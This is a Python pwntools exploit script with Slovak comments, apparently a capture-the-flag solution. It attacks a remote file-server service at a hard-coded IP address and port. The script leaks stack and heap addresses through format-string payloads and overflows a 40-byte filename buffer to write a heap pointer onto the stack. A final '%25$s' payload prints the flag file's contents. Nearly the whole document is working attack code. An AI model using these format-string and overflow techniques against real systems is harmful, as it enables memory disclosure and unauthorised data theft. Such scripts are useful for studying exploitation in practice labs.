from pwn import *
from pwn import p64
context.log_level = 'critical'
conn = remote('80.211.209.10', 7127)
conn.recvuntil(b'> ')

# zapisanie dôležitých pointerov do debug.log
numbers = [9,8]
for n in numbers:
    payload = b'%' + str(n).encode() +b'$p'
    conn.send(payload)
    conn.recvuntil(b'> ')

# login
payload = b'login' + b'\n'
conn.send(payload)
conn.recvuntil(b'username> ')
payload = b'guest' + b'\n'
conn.send(payload)
conn.recvuntil(b'password> ')
payload = b'guest' + b'\n'
conn.send(payload)

# uloženie vlajky do heapu
conn.recvuntil(b'# ')
payload = b'get flag.txt\n'
conn.send(payload)
conn.recvuntil(b'# ')
payload = b'get flag.txt\n'
conn.send(payload)
conn.recvuntil(b'# ')
payload = b'get flag.txt\n'
conn.send(payload)
conn.recvuntil(b'# ')
payload = b'get flag.txt\n'
conn.send(payload)
conn.recvuntil(b'# ')

# print pointerov na klienta
payload = b'get debug.log\n'
conn.send(payload)
resp = conn.recvuntil(b'# ')

# konvert printnutých pointerov zo stringu na číslo
hex1 = resp[65:65 + 12].decode('utf-8')
value1 = int(hex1,16)
hex2 = resp[107:107 + 12].decode('utf-8')
value2 = int(hex2,16)

# kalkulácia adresy stracku kam zapíšeme pointer na heap, kde máme vlajku
where_to_put = value1 - 0x20 
what_to_put = value2 - 0x720 + 0x1710 + 0x1
# -0x720 heap base 
# +0x1710 obsah súboru s vlajkou
# +0x1 nech nezobrazí prvý snak vlajky

print(hex(where_to_put))
print(hex(what_to_put))

# vytvorenie súboru, kde 41-46 bajt je adresa stacku
command = b'put ' + b'A'*40 + p64(where_to_put)
conn.send(command)
conn.recvuntil(b'text>')
payload = p64(what_to_put) # obsah súboru je adresa kde v heape je vlajka bez prvého S
command = payload
conn.send(command)

# prečítanie súboru, kde 41-46 bajt názvu je overflow, aby sme obsah súboru zapísali inde
conn.recvuntil(b'# ')
command = b'get ' + b'A'*40 + p64(where_to_put)
conn.send(command)
conn.recvuntil(b'# ')

# vyčistíme debug.log
command = b'put debug.log\n'
conn.send(command)
conn.recvuntil(b'text>')
payload = b"\n"
command = payload
conn.send(command)
conn.recvuntil(b'# ')

# zapíše obsah pointeru, čiže vlajku bez S do debug.log
payload = b'%25$s'
conn.send(payload)
conn.recvuntil(b'# ')

# vypíšeme obsah debug.log na klienta
payload = b'get debug.log\n'
conn.send(payload)
result = conn.recvuntil(b'# ')

# printneme 
print(result.decode("latin-1"))

